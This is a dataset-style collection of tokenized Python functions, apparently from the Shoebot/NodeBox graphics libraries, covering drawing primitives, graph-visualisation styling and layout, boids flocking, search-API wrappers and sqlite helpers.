def drawdaisy ( x , y , color = '#fefefe' ) : # save location, size etc _ctx . push ( ) # save fill and stroke _fill = _ctx . fill ( ) _stroke = _ctx . stroke ( ) sc = ( 1.0 / _ctx . HEIGHT ) * float ( y * 0.5 ) * 4.0 # draw stalk _ctx . strokewidth ( sc * 2.0 ) _ctx . stroke ( '#3B240B' ) _ctx . line ( x + ( sin ( x * 0.1 ) * 10.0 ) , y + 80 , x + sin ( _ctx . FRAME * 0.1 ) , y ) # draw flower _ctx . translate ( - 20 , 0 ) _ctx . scale ( sc ) # draw petals _ctx . fill ( color ) _ctx . nostroke ( ) for angle in xrange ( 0 , 360 , 45 ) : _ctx . rotate ( degrees = 45 ) _ctx . rect ( x , y , 40 , 8 , 1 ) # draw centre _ctx . fill ( '#F7FE2E' ) _ctx . ellipse ( x + 15 , y , 10 , 10 ) # restore fill and stroke _ctx . fill ( _fill ) _ctx . stroke ( _stroke ) # restore location, size etc _ctx . pop ( )
def flatten_fft ( scale = 1.0 ) : _len = len ( audio . spectrogram ) for i , v in enumerate ( audio . spectrogram ) : yield scale * ( i * v ) / _len
def scaled_fft ( fft , scale = 1.0 ) : data = np . zeros ( len ( fft ) ) for i , v in enumerate ( fft ) : data [ i ] = scale * ( i * v ) / NUM_SAMPLES return data
def _create_view ( self , name = "shoebot-output" ) : view = gtk . TextView ( ) view . set_editable ( False ) fontdesc = pango . FontDescription ( "Monospace" ) view . modify_font ( fontdesc ) view . set_name ( name ) buff = view . get_buffer ( ) buff . create_tag ( 'error' , foreground = 'red' ) return view
def loadGrammar ( self , grammar , searchpaths = None ) : self . grammar = self . _load ( grammar , searchpaths = searchpaths ) self . refs = { } for ref in self . grammar . getElementsByTagName ( "ref" ) : self . refs [ ref . attributes [ "id" ] . value ] = ref
def not_found ( url , wait = 10 ) : try : connection = open ( url , wait ) except HTTP404NotFound : return True except : return False return False
def image ( self , path , x , y , width = None , height = None , alpha = 1.0 , data = None , draw = True , * * kwargs ) : return self . Image ( path , x , y , width , height , alpha , data , * * kwargs )
def star ( self , startx , starty , points = 20 , outer = 100 , inner = 50 , draw = True , * * kwargs ) : # Taken from Nodebox. self . beginpath ( * * kwargs ) self . moveto ( startx , starty + outer ) for i in range ( 1 , int ( 2 * points ) ) : angle = i * pi / points x = sin ( angle ) y = cos ( angle ) if i % 2 : radius = inner else : radius = outer x = startx + radius * x y = starty + radius * y self . lineto ( x , y ) return self . endpath ( draw )
def relmoveto ( self , x , y ) : if self . _path is None : raise ShoebotError ( _ ( "No current path. Use beginpath() first." ) ) self . _path . relmoveto ( x , y )
def rellineto ( self , x , y ) : if self . _path is None : raise ShoebotError ( _ ( "No current path. Use beginpath() first." ) ) self . _path . rellineto ( x , y )
def relcurveto ( self , h1x , h1y , h2x , h2y , x , y ) : if self . _path is None : raise ShoebotError ( _ ( "No current path. Use beginpath() first." ) ) self . _path . relcurveto ( h1x , h1y , h2x , h2y , x , y )
def graph_background ( s ) : if s . background == None : s . _ctx . background ( None ) else : s . _ctx . background ( s . background ) if s . depth : try : clr = colors . color ( s . background ) . darker ( 0.2 ) p = s . _ctx . rect ( 0 , 0 , s . _ctx . WIDTH , s . _ctx . HEIGHT , draw = False ) colors . gradientfill ( p , clr , clr . lighter ( 0.35 ) ) colors . shadow ( dx = 0 , dy = 0 , blur = 2 , alpha = 0.935 , clr = s . background ) except : pass
def node ( s , node , alpha = 1.0 ) : if s . depth : try : colors . shadow ( dx = 5 , dy = 5 , blur = 10 , alpha = 0.5 * alpha ) except : pass s . _ctx . nofill ( ) s . _ctx . nostroke ( ) if s . fill : s . _ctx . fill ( s . fill . r , s . fill . g , s . fill . b , s . fill . a * alpha ) if s . stroke : s . _ctx . strokewidth ( s . strokewidth ) s . _ctx . stroke ( s . stroke . r , s . stroke . g , s . stroke . b , s . stroke . a * alpha * 3 ) r = node . r s . _ctx . oval ( node . x - r , node . y - r , r * 2 , r * 2 )
def node_label ( s , node , alpha = 1.0 ) : if s . text : #s._ctx.lineheight(1)     s . _ctx . font ( s . font ) s . _ctx . fontsize ( s . fontsize ) s . _ctx . nostroke ( ) s . _ctx . fill ( s . text . r , s . text . g , s . text . b , s . text . a * alpha ) # Cache an outlined label text and translate it. # This enhances the speed and avoids wiggling text. try : p = node . _textpath except : txt = node . label try : txt = unicode ( txt ) except : try : txt = txt . decode ( "utf-8" ) except : pass # Abbreviation. #root = node.graph.root #if txt != root and txt[-len(root):] == root:  #    txt = txt[:len(txt)-len(root)]+root[0]+"." dx , dy = 0 , 0 if s . align == 2 : #CENTER dx = - s . _ctx . textwidth ( txt , s . textwidth ) / 2 dy = s . _ctx . textheight ( txt ) / 2 node . _textpath = s . _ctx . textpath ( txt , dx , dy , width = s . textwidth ) p = node . _textpath if s . depth : try : __colors . shadow ( dx = 2 , dy = 4 , blur = 5 , alpha = 0.3 * alpha ) except : pass s . _ctx . push ( ) s . _ctx . translate ( node . x , node . y ) s . _ctx . scale ( alpha ) s . _ctx . drawpath ( p . copy ( ) ) s . _ctx . pop ( )
def edges ( s , edges , alpha = 1.0 , weighted = False , directed = False ) : p = s . _ctx . BezierPath ( ) if directed and s . stroke : pd = s . _ctx . BezierPath ( ) if weighted and s . fill : pw = [ s . _ctx . BezierPath ( ) for i in range ( 11 ) ] # Draw the edges in a single BezierPath for speed. # Weighted edges are divided into ten BezierPaths, # depending on their weight rounded between 0 and 10. if len ( edges ) == 0 : return for e in edges : try : s2 = e . node1 . graph . styles [ e . node1 . style ] except : s2 = s if s2 . edge : s2 . edge ( s2 , p , e , alpha ) if directed and s . stroke : s2 . edge_arrow ( s2 , pd , e , radius = 10 ) if weighted and s . fill : s2 . edge ( s2 , pw [ int ( e . weight * 10 ) ] , e , alpha ) s . _ctx . autoclosepath ( False ) s . _ctx . nofill ( ) s . _ctx . nostroke ( ) # All weighted edges use the default fill. if weighted and s . fill : r = e . node1 . __class__ ( None ) . r s . _ctx . stroke ( s . fill . r , s . fill . g , s . fill . b , s . fill . a * 0.65 * alpha ) for w in range ( 1 , len ( pw ) ) : s . _ctx . strokewidth ( r * w * 0.1 ) s . _ctx . drawpath ( pw [ w ] . copy ( ) ) # All edges use the default stroke. if s . stroke : s . _ctx . strokewidth ( s . strokewidth ) s . _ctx . stroke ( s . stroke . r , s . stroke . g , s . stroke . b , s . stroke . a * 0.65 * alpha ) s . _ctx . drawpath ( p . copy ( ) ) if directed and s . stroke : #clr = s._ctx.stroke().copy() clr = s . _ctx . color ( s . stroke . r , s . stroke . g , s . stroke . b , s . stroke . a * 0.65 * alpha ) clr . a *= 1.3 s . _ctx . stroke ( clr ) s . _ctx . drawpath ( pd . copy ( ) ) for e in edges : try : s2 = self . styles [ e . node1 . style ] except : s2 = s if s2 . edge_label : s2 . edge_label ( s2 , e , alpha )
def edge ( s , path , edge , alpha = 1.0 ) : path . moveto ( edge . node1 . x , edge . node1 . y ) if edge . node2 . style == BACK : path . curveto ( edge . node1 . x , edge . node2 . y , edge . node2 . x , edge . node2 . y , edge . node2 . x , edge . node2 . y , ) else : path . lineto ( edge . node2 . x , edge . node2 . y )
def edge_label ( s , edge , alpha = 1.0 ) : if s . text and edge . label != "" : s . _ctx . nostroke ( ) s . _ctx . fill ( s . text . r , s . text . g , s . text . b , s . text . a * alpha * 0.75 ) s . _ctx . lineheight ( 1 ) s . _ctx . font ( s . font ) s . _ctx . fontsize ( s . fontsize * 0.75 ) # Cache an outlined label text and translate it. # This enhances the speed and avoids wiggling text. try : p = edge . _textpath except : try : txt = unicode ( edge . label ) except : try : txt = edge . label . decode ( "utf-8" ) except : pass edge . _textpath = s . _ctx . textpath ( txt , s . _ctx . textwidth ( " " ) , 0 , width = s . textwidth ) p = edge . _textpath # Position the label centrally along the edge line. a = degrees ( atan2 ( edge . node2 . y - edge . node1 . y , edge . node2 . x - edge . node1 . x ) ) d = sqrt ( ( edge . node2 . x - edge . node1 . x ) ** 2 + ( edge . node2 . y - edge . node1 . y ) ** 2 ) d = abs ( d - s . _ctx . textwidth ( edge . label ) ) * 0.5 s . _ctx . push ( ) s . _ctx . transform ( CORNER ) s . _ctx . translate ( edge . node1 . x , edge . node1 . y ) s . _ctx . rotate ( - a ) s . _ctx . translate ( d , s . fontsize * 1.0 ) s . _ctx . scale ( alpha ) # Flip labels on the left hand side so they are legible. if 90 < a % 360 < 270 : s . _ctx . translate ( s . _ctx . textwidth ( edge . label ) , - s . fontsize * 2.0 ) s . _ctx . transform ( CENTER ) s . _ctx . rotate ( 180 ) s . _ctx . transform ( CORNER ) s . _ctx . drawpath ( p . copy ( ) ) s . _ctx . pop ( )
def path ( s , graph , path ) : def end ( n ) : r = n . r * 0.35 s . _ctx . oval ( n . x - r , n . y - r , r * 2 , r * 2 ) if path and len ( path ) > 1 and s . stroke : s . _ctx . nofill ( ) s . _ctx . stroke ( s . stroke . r , s . stroke . g , s . stroke . b , s . stroke . a ) if s . name != DEFAULT : s . _ctx . strokewidth ( s . strokewidth ) else : s . _ctx . strokewidth ( s . strokewidth * 2 ) first = True for id in path : n = graph [ id ] if first : first = False s . _ctx . beginpath ( n . x , n . y ) end ( n ) else : s . _ctx . lineto ( n . x , n . y ) s . _ctx . endpath ( ) end ( n )
def copy ( self , graph ) : s = styles ( graph ) s . guide = self . guide . copy ( graph ) dict . __init__ ( s , [ ( v . name , v . copy ( ) ) for v in self . values ( ) ] ) return s
def apply ( self ) : sorted = self . order + self . keys ( ) unique = [ ] [ unique . append ( x ) for x in sorted if x not in unique ] for node in self . graph . nodes : for s in unique : if self . has_key ( s ) and self [ s ] ( self . graph , node ) : node . style = s
def copy ( self , graph ) : g = styleguide ( graph ) g . order = self . order dict . __init__ ( g , [ ( k , v ) for k , v in self . iteritems ( ) ] ) return g
def callback ( self , * incoming ) : message = incoming [ 0 ] if message : address , command = message [ 0 ] , message [ 2 ] profile = self . get_profile ( address ) if profile is not None : try : getattr ( profile , command ) ( self , message ) except AttributeError : pass
def copytree ( src , dst , symlinks = False , ignore = None ) : # http://stackoverflow.com/questions/1868714/how-do-i-copy-an-entire-directory-of-files-into-an-existing-directory-using-pyth if not os . path . exists ( dst ) : os . makedirs ( dst ) shutil . copystat ( src , dst ) lst = os . listdir ( src ) if ignore : excl = ignore ( src , lst ) lst = [ x for x in lst if x not in excl ] for item in lst : s = os . path . join ( src , item ) d = os . path . join ( dst , item ) if symlinks and os . path . islink ( s ) : if os . path . lexists ( d ) : os . remove ( d ) os . symlink ( os . readlink ( s ) , d ) try : st = os . lstat ( s ) mode = stat . S_IMODE ( st . st_mode ) os . lchmod ( d , mode ) except : pass # lchmod not available elif os . path . isdir ( s ) : copytree ( s , d , symlinks , ignore ) else : shutil . copy2 ( s , d )
def search ( q , start = 0 , wait = 10 , asynchronous = False , cached = False ) : service = GOOGLE_SEARCH return GoogleSearch ( q , start , service , "" , wait , asynchronous , cached )
def search_images ( q , start = 0 , size = "" , wait = 10 , asynchronous = False , cached = False ) : service = GOOGLE_IMAGES return GoogleSearch ( q , start , service , size , wait , asynchronous , cached )
def search_news ( q , start = 0 , wait = 10 , asynchronous = False , cached = False ) : service = GOOGLE_NEWS return GoogleSearch ( q , start , service , "" , wait , asynchronous , cached )
def search_blogs ( q , start = 0 , wait = 10 , asynchronous = False , cached = False ) : service = GOOGLE_BLOGS return GoogleSearch ( q , start , service , "" , wait , asynchronous , cached )
def _parse ( self , str ) : str = replace_entities ( str ) str = strip_tags ( str ) str = collapse_spaces ( str ) return str
def hash ( self , id ) : h = md5 ( id ) . hexdigest ( ) return os . path . join ( self . path , h + self . type )
def age ( self , id ) : path = self . hash ( id ) if os . path . exists ( path ) : modified = datetime . datetime . fromtimestamp ( os . stat ( path ) [ 8 ] ) age = datetime . datetime . today ( ) - modified return age . days else : return 0
def angle ( x0 , y0 , x1 , y1 ) : return degrees ( atan2 ( y1 - y0 , x1 - x0 ) )
def distance ( x0 , y0 , x1 , y1 ) : return sqrt ( pow ( x1 - x0 , 2 ) + pow ( y1 - y0 , 2 ) )
def invert ( self ) : m = self . matrix d = m [ 0 ] * m [ 4 ] - m [ 1 ] * m [ 3 ] self . matrix = [ m [ 4 ] / d , - m [ 1 ] / d , 0 , - m [ 3 ] / d , m [ 0 ] / d , 0 , ( m [ 3 ] * m [ 7 ] - m [ 4 ] * m [ 6 ] ) / d , - ( m [ 0 ] * m [ 7 ] - m [ 1 ] * m [ 6 ] ) / d , 1 ]
def transform_path ( self , path ) : p = path . __class__ ( ) for pt in path : if pt . cmd == "close" : p . closepath ( ) elif pt . cmd == "moveto" : p . moveto ( * self . apply ( pt . x , pt . y ) ) elif pt . cmd == "lineto" : p . lineto ( * self . apply ( pt . x , pt . y ) ) elif pt . cmd == "curveto" : vx1 , vy1 = self . apply ( pt . ctrl1 . x , pt . ctrl1 . y ) vx2 , vy2 = self . apply ( pt . ctrl2 . x , pt . ctrl2 . y ) x , y = self . apply ( pt . x , pt . y ) p . curveto ( vx1 , vy1 , vx2 , vy2 , x , y ) return p
def intersects ( self , b ) : return max ( self . x , b . x ) < min ( self . x + self . width , b . x + b . width ) and max ( self . y , b . y ) < min ( self . y + self . height , b . y + b . height )
def union ( self , b ) : mx , my = min ( self . x , b . x ) , min ( self . y , b . y ) return Bounds ( mx , my , max ( self . x + self . width , b . x + b . width ) - mx , max ( self . y + self . height , b . y + b . height ) - my )
def contains ( self , * a ) : if len ( a ) == 2 : a = [ Point ( a [ 0 ] , a [ 1 ] ) ] if len ( a ) == 1 : a = a [ 0 ] if isinstance ( a , Point ) : return a . x >= self . x and a . x <= self . x + self . width and a . y >= self . y and a . y <= self . y + self . height if isinstance ( a , Bounds ) : return a . x >= self . x and a . x + a . width <= self . x + self . width and a . y >= self . y and a . y + a . height <= self . y + self . height
def error ( message ) : global parser print ( _ ( "Error: " ) + message ) print ( ) parser . print_help ( ) sys . exit ( )
def fill ( self , * args ) : self . _fillcolor = self . color ( * args ) return self . _fillcolor
def stroke ( self , * args ) : self . _strokecolor = self . color ( * args ) return self . _strokecolor
def textpath ( self , txt , x , y , width = None , height = 1000000 , enableRendering = False , * * kwargs ) : txt = self . Text ( txt , x , y , width , height , * * kwargs ) path = txt . path if draw : path . draw ( ) return path
def draw_cornu_flat ( x0 , y0 , t0 , t1 , s0 , c0 , flip , cs , ss , cmd ) : for j in range ( 0 , 100 ) : t = j * .01 s , c = eval_cornu ( t0 + t * ( t1 - t0 ) ) s *= flip s -= s0 c -= c0 #print '%', c, s x = c * cs - s * ss y = s * cs + c * ss print_pt ( x0 + x , y0 + y , cmd ) cmd = 'lineto' return cmd
def draw_cornu_bezier ( x0 , y0 , t0 , t1 , s0 , c0 , flip , cs , ss , cmd , scale , rot ) : s = None for j in range ( 0 , 5 ) : # travel along the function two points at a time (at time t and t2) # the first time through we'll need to get both points # after that we only need the second point because the old second point # becomes the new first point t = j * .2 t2 = t + .2 curvetime = t0 + t * ( t1 - t0 ) curvetime2 = t0 + t2 * ( t1 - t0 ) Dt = ( curvetime2 - curvetime ) * scale if not s : # get first point # avoid calling this again: the next time though x,y will equal x3, y3 s , c = eval_cornu ( curvetime ) s *= flip s -= s0 c -= c0 # calculate derivative of fresnel function at point to get tangent slope # just take the integrand of the fresnel function dx1 = cos ( pow ( curvetime , 2 ) + ( flip * rot ) ) dy1 = flip * sin ( pow ( curvetime , 2 ) + ( flip * rot ) ) # x,y = first point on function x = ( ( c * cs - s * ss ) + x0 ) y = ( ( s * cs + c * ss ) + y0 ) #evaluate the fresnel further along the function to look ahead to the next point s2 , c2 = eval_cornu ( curvetime2 ) s2 *= flip s2 -= s0 c2 -= c0 dx2 = cos ( pow ( curvetime2 , 2 ) + ( flip * rot ) ) dy2 = flip * sin ( pow ( curvetime2 , 2 ) + ( flip * rot ) ) # x3, y3 = second point on function x3 = ( ( c2 * cs - s2 * ss ) + x0 ) y3 = ( ( s2 * cs + c2 * ss ) + y0 ) # calculate control points x1 = ( x + ( ( Dt / 3.0 ) * dx1 ) ) y1 = ( y + ( ( Dt / 3.0 ) * dy1 ) ) x2 = ( x3 - ( ( Dt / 3.0 ) * dx2 ) ) y2 = ( y3 - ( ( Dt / 3.0 ) * dy2 ) ) if cmd == 'moveto' : print_pt ( x , y , cmd ) cmd = 'curveto' print_crv ( x1 , y1 , x2 , y2 , x3 , y3 ) dx1 , dy1 = dx2 , dy2 x , y = x3 , y3 return cmd
def search ( q , start = 1 , count = 10 , context = None , wait = 10 , asynchronous = False , cached = False ) : service = YAHOO_SEARCH return YahooSearch ( q , start , count , service , context , wait , asynchronous , cached )
def search_images ( q , start = 1 , count = 10 , wait = 10 , asynchronous = False , cached = False ) : service = YAHOO_IMAGES return YahooSearch ( q , start , count , service , None , wait , asynchronous , cached )
def search_news ( q , start = 1 , count = 10 , wait = 10 , asynchronous = False , cached = False ) : service = YAHOO_NEWS return YahooSearch ( q , start , count , service , None , wait , asynchronous , cached )
def suggest_spelling ( q , wait = 10 , asynchronous = False , cached = False ) : return YahooSpelling ( q , wait , asynchronous , cached )
def _parse ( self , e , tag ) : tags = e . getElementsByTagName ( tag ) children = tags [ 0 ] . childNodes if len ( children ) != 1 : return None assert children [ 0 ] . nodeType == xml . dom . minidom . Element . TEXT_NODE s = children [ 0 ] . nodeValue s = format_data ( s ) s = replace_entities ( s ) return s
def delete ( self ) : i = self . index ( ) if i != None : del self . canvas . layers [ i ]
def up ( self ) : i = self . index ( ) if i != None : del self . canvas . layers [ i ] i = min ( len ( self . canvas . layers ) , i + 1 ) self . canvas . layers . insert ( i , self )
def down ( self ) : i = self . index ( ) if i != None : del self . canvas . layers [ i ] i = max ( 0 , i - 1 ) self . canvas . layers . insert ( i , self )
def invert ( self ) : alpha = self . img . split ( ) [ 3 ] self . img = self . img . convert ( "RGB" ) self . img = ImageOps . invert ( self . img ) self . img = self . img . convert ( "RGBA" ) self . img . putalpha ( alpha )
def flip ( self , axis = HORIZONTAL ) : if axis == HORIZONTAL : self . img = self . img . transpose ( Image . FLIP_LEFT_RIGHT ) if axis == VERTICAL : self . img = self . img . transpose ( Image . FLIP_TOP_BOTTOM )
def _should_run ( self , iteration , max_iterations ) : if iteration == 0 : # First frame always runs return True if max_iterations : if iteration < max_iterations : return True elif max_iterations is None : if self . _dynamic : return True else : return False return True if not self . _dynamic : return False return False
def hex_to_rgb ( hex ) : hex = hex . lstrip ( "#" ) if len ( hex ) < 6 : hex += hex [ - 1 ] * ( 6 - len ( hex ) ) if len ( hex ) == 6 : r , g , b = hex [ 0 : 2 ] , hex [ 2 : 4 ] , hex [ 4 : ] r , g , b = [ int ( n , 16 ) / 255.0 for n in ( r , g , b ) ] a = 1.0 elif len ( hex ) == 8 : r , g , b , a = hex [ 0 : 2 ] , hex [ 2 : 4 ] , hex [ 4 : 6 ] , hex [ 6 : ] r , g , b , a = [ int ( n , 16 ) / 255.0 for n in ( r , g , b , a ) ] return r , g , b , a
def simple_traceback ( ex , source ) : exc_type , exc_value , exc_tb = sys . exc_info ( ) exc = traceback . format_exception ( exc_type , exc_value , exc_tb ) source_arr = source . splitlines ( ) # Defaults... exc_location = exc [ - 2 ] for i , err in enumerate ( exc ) : if 'exec source in ns' in err : exc_location = exc [ i + 1 ] break # extract line number from traceback fn = exc_location . split ( ',' ) [ 0 ] [ 8 : - 1 ] line_number = int ( exc_location . split ( ',' ) [ 1 ] . replace ( 'line' , '' ) . strip ( ) ) # Build error messages err_msgs = [ ] # code around the error err_where = ' ' . join ( exc [ i - 1 ] . split ( ',' ) [ 1 : ] ) . strip ( ) # 'line 37 in blah" err_msgs . append ( 'Error in the Shoebot script at %s:' % err_where ) for i in xrange ( max ( 0 , line_number - 5 ) , line_number ) : if fn == "<string>" : line = source_arr [ i ] else : line = linecache . getline ( fn , i + 1 ) err_msgs . append ( '%s: %s' % ( i + 1 , line . rstrip ( ) ) ) err_msgs . append ( '  %s^ %s' % ( len ( str ( i ) ) * ' ' , exc [ - 1 ] . rstrip ( ) ) ) err_msgs . append ( '' ) # traceback err_msgs . append ( exc [ 0 ] . rstrip ( ) ) for err in exc [ 3 : ] : err_msgs . append ( err . rstrip ( ) ) return '\n' . join ( err_msgs )
def close ( self ) : self . _con . commit ( ) self . _cur . close ( ) self . _con . close ( )
def sql ( self , sql ) : self . _cur . execute ( sql ) if sql . lower ( ) . find ( "select" ) >= 0 : matches = [ ] for r in self . _cur : matches . append ( r ) return matches
def edit ( self , id , * args , * * kw ) : if args and kw : return if args and type ( args [ 0 ] ) == dict : fields = [ k for k in args [ 0 ] ] v = [ args [ 0 ] [ k ] for k in args [ 0 ] ] if kw : fields = [ k for k in kw ] v = [ kw [ k ] for k in kw ] sql = "update " + self . _name + " set " + "=?, " . join ( fields ) + "=? where " + self . _key + "=" + unicode ( id ) self . _db . _cur . execute ( sql , v ) self . _db . _i += 1 if self . _db . _i >= self . _db . _commit : self . _db . _i = 0 self . _db . _con . commit ( )
def remove ( self , id , operator = "=" , key = None ) : if key == None : key = self . _key try : id = unicode ( id ) except : pass sql = "delete from " + self . _name + " where " + key + " " + operator + " ?" self . _db . _cur . execute ( sql , ( id , ) )
def reload_functions ( self ) : with LiveExecution . lock : if self . edited_source : tree = ast . parse ( self . edited_source ) for f in [ n for n in ast . walk ( tree ) if isinstance ( n , ast . FunctionDef ) ] : self . ns [ f . name ] . __code__ = meta . decompiler . compile_func ( f , self . filename , self . ns ) . __code__
def run ( self ) : with LiveExecution . lock : if self . edited_source : success , ex = self . run_tenuous ( ) if success : return self . do_exec ( self . known_good , self . ns )
def alignment ( self , d = 5 ) : vx = vy = vz = 0 for b in self . boids : if b != self : vx , vy , vz = vx + b . vx , vy + b . vy , vz + b . vz n = len ( self . boids ) - 1 vx , vy , vz = vx / n , vy / n , vz / n return ( vx - self . vx ) / d , ( vy - self . vy ) / d , ( vz - self . vz ) / d
def _angle ( self ) : from math import atan , pi , degrees a = degrees ( atan ( self . vy / self . vx ) ) + 360 if self . vx < 0 : a += 180 return a
def goal ( self , x , y , z , d = 50.0 ) : return ( x - self . x ) / d , ( y - self . y ) / d , ( z - self . z ) / d
def update ( self , shuffled = True , cohesion = 100 , separation = 10 , alignment = 5 , goal = 20 , limit = 30 ) : # Shuffling the list of boids ensures fluid movement. # If you need the boids to retain their position in the list # each update, set the shuffled parameter to False. from random import shuffle if shuffled : shuffle ( self ) m1 = 1.0 # cohesion m2 = 1.0 # separation m3 = 1.0 # alignment m4 = 1.0 # goal # The flock scatters randomly with a Boids.scatter chance. # This means their cohesion (m1) is reversed, # and their joint alignment (m3) is dimished, # causing boids to oscillate in confusion. # Setting Boids.scatter(chance=0) ensures they never scatter. if not self . scattered and _ctx . random ( ) < self . _scatter : self . scattered = True if self . scattered : m1 = - m1 m3 *= 0.25 self . _scatter_i += 1 if self . _scatter_i >= self . _scatter_t : self . scattered = False self . _scatter_i = 0 # A flock can have a goal defined with Boids.goal(x,y,z), # a place of interest to flock around. if not self . has_goal : m4 = 0 if self . flee : m4 = - m4 for b in self : # A boid that is perching will continue to do so # until Boid._perch_t reaches zero. if b . is_perching : if b . _perch_t > 0 : b . _perch_t -= 1 continue else : b . is_perching = False vx1 , vy1 , vz1 = b . cohesion ( cohesion ) vx2 , vy2 , vz2 = b . separation ( separation ) vx3 , vy3 , vz3 = b . alignment ( alignment ) vx4 , vy4 , vz4 = b . goal ( self . _gx , self . _gy , self . _gz , goal ) b . vx += m1 * vx1 + m2 * vx2 + m3 * vx3 + m4 * vx4 b . vy += m1 * vy1 + m2 * vy2 + m3 * vy3 + m4 * vy4 b . vz += m1 * vz1 + m2 * vz2 + m3 * vz3 + m4 * vz4 b . limit ( limit ) b . x += b . vx b . y += b . vy b . z += b . vz self . constrain ( )
def iterscan ( self , string , idx = 0 , context = None ) : match = self . scanner . scanner ( string , idx ) . match actions = self . actions lastend = idx end = len ( string ) while True : m = match ( ) if m is None : break matchbegin , matchend = m . span ( ) if lastend == matchend : break action = actions [ m . lastindex ] if action is not None : rval , next_pos = action ( m , context ) if next_pos is not None and next_pos != matchend : # "fast forward" the scanner matchend = next_pos match = self . scanner . scanner ( string , matchend ) . match yield rval , matchend lastend = matchend
def copy ( self , graph ) : l = self . __class__ ( graph , self . n ) l . i = 0 return l
def create ( iterations = 1000 , distance = 1.0 , layout = LAYOUT_SPRING , depth = True ) : #global _ctx _ctx . colormode ( _ctx . RGB ) g = graph ( iterations , distance , layout ) # Styles for different types of nodes. s = style . style g . styles . append ( s ( style . LIGHT , _ctx , fill = _ctx . color ( 0.0 , 0.0 , 0.0 , 0.20 ) ) ) g . styles . append ( s ( style . DARK , _ctx , fill = _ctx . color ( 0.3 , 0.5 , 0.7 , 0.75 ) ) ) g . styles . append ( s ( style . BACK , _ctx , fill = _ctx . color ( 0.5 , 0.8 , 0.0 , 0.50 ) ) ) g . styles . append ( s ( style . IMPORTANT , _ctx , fill = _ctx . color ( 0.3 , 0.6 , 0.8 , 0.75 ) ) ) g . styles . append ( s ( style . HIGHLIGHT , _ctx , stroke = _ctx . color ( 1.0 , 0.0 , 0.5 ) , strokewidth = 1.5 ) ) g . styles . append ( s ( style . MARKED , _ctx ) ) g . styles . append ( s ( style . ROOT , _ctx , text = _ctx . color ( 1.0 , 0.0 , 0.4 , 1.00 ) , stroke = _ctx . color ( 0.8 , 0.8 , 0.8 , 0.60 ) , strokewidth = 1.5 , fontsize = 16 , textwidth = 150 ) ) # Important nodes get a double stroke. def important_node ( s , node , alpha = 1.0 ) : style . style ( None , _ctx ) . node ( s , node , alpha ) r = node . r * 1.4 _ctx . nofill ( ) _ctx . oval ( node . x - r , node . y - r , r * 2 , r * 2 ) # Marked nodes have an inner dot. def marked_node ( s , node , alpha = 1.0 ) : style . style ( None , _ctx ) . node ( s , node , alpha ) r = node . r * 0.3 _ctx . fill ( s . stroke ) _ctx . oval ( node . x - r , node . y - r , r * 2 , r * 2 ) g . styles . important . node = important_node g . styles . marked . node = marked_node g . styles . depth = depth # Styling guidelines. All nodes have the default style, except: # 1) a node directly connected to the root gets the LIGHT style. # 2) a node with more than 4 edges gets the DARK style. # 3) a node with a weight of 0.75-1.0 gets the IMPORTANT style. # 4) the graph.root node gets the ROOT style. # 5) the node last clicked gets the BACK style.     g . styles . guide . append ( style . LIGHT , lambda graph , node : graph . root in node . links ) g . styles . guide . append ( style . DARK , lambda graph , node : len ( node . links ) > 4 ) g . styles . guide . append ( style . IMPORTANT , lambda graph , node : node . weight > 0.75 ) g . styles . guide . append ( style . ROOT , lambda graph , node : node == graph . root ) g . styles . guide . append ( style . BACK , lambda graph , node : node == graph . events . clicked ) # An additional rule applies every node's weight to its radius. def balance ( graph , node ) : node . r = node . r * 0.75 + node . r * node . weight * 0.75 g . styles . guide . append ( "balance" , balance ) # An additional rule that keeps leaf nodes closely clustered. def cluster ( graph , node ) : if len ( node . links ) == 1 : node . links . edge ( node . links [ 0 ] ) . length *= 0.5 g . styles . guide . append ( "cluster" , cluster ) g . styles . guide . order = [ style . LIGHT , style . DARK , style . IMPORTANT , style . ROOT , style . BACK , "balance" , "nurse" ] return g
def clear ( self ) : dict . clear ( self ) self . nodes = [ ] self . edges = [ ] self . root = None self . layout . i = 0 self . alpha = 0
def add_node ( self , id , radius = 8 , style = style . DEFAULT , category = "" , label = None , root = False , properties = { } ) : if self . has_key ( id ) : return self [ id ] if not isinstance ( style , str ) and style . __dict__ . has_key [ "name" ] : style = style . name n = node ( self , id , radius , style , category , label , properties ) self [ n . id ] = n self . nodes . append ( n ) if root : self . root = n return n
def remove_node ( self , id ) : if self . has_key ( id ) : n = self [ id ] self . nodes . remove ( n ) del self [ id ] # Remove all edges involving id and all links to it. for e in list ( self . edges ) : if n in ( e . node1 , e . node2 ) : if n in e . node1 . links : e . node1 . links . remove ( n ) if n in e . node2 . links : e . node2 . links . remove ( n ) self . edges . remove ( e )
def remove_edge ( self , id1 , id2 ) : for e in list ( self . edges ) : if id1 in ( e . node1 . id , e . node2 . id ) and id2 in ( e . node1 . id , e . node2 . id ) : e . node1 . links . remove ( e . node2 ) e . node2 . links . remove ( e . node1 ) self . edges . remove ( e )
def edge ( self , id1 , id2 ) : if id1 in self and id2 in self and self [ id2 ] in self [ id1 ] . links : return self [ id1 ] . links . edge ( id2 ) return None
def update ( self , iterations = 10 ) : # The graph fades in when initially constructed. self . alpha += 0.05 self . alpha = min ( self . alpha , 1.0 ) # Iterates over the graph's layout. # Each step the graph's bounds are recalculated # and a number of iterations are processed, # more and more as the layout progresses. if self . layout . i == 0 : self . layout . prepare ( ) self . layout . i += 1 elif self . layout . i == 1 : self . layout . iterate ( ) elif self . layout . i < self . layout . n : n = min ( iterations , self . layout . i / 10 + 1 ) for i in range ( n ) : self . layout . iterate ( ) # Calculate the absolute center of the graph. min_ , max = self . layout . bounds self . x = _ctx . WIDTH - max . x * self . d - min_ . x * self . d self . y = _ctx . HEIGHT - max . y * self . d - min_ . y * self . d self . x /= 2 self . y /= 2 return not self . layout . done
def offset ( self , node ) : x = self . x + node . x - _ctx . WIDTH / 2 y = self . y + node . y - _ctx . HEIGHT / 2 return x , y
def prune ( self , depth = 0 ) : for n in list ( self . nodes ) : if len ( n . links ) <= depth : self . remove_node ( n . id )
def nodes_by_category ( self , category ) : return [ n for n in self . nodes if n . category == category ]
def crown ( self , depth = 2 ) : nodes = [ ] for node in self . leaves : nodes += node . flatten ( depth - 1 ) return cluster . unique ( nodes )
def _density ( self ) : return 2.0 * len ( self . edges ) / ( len ( self . nodes ) * ( len ( self . nodes ) - 1 ) )
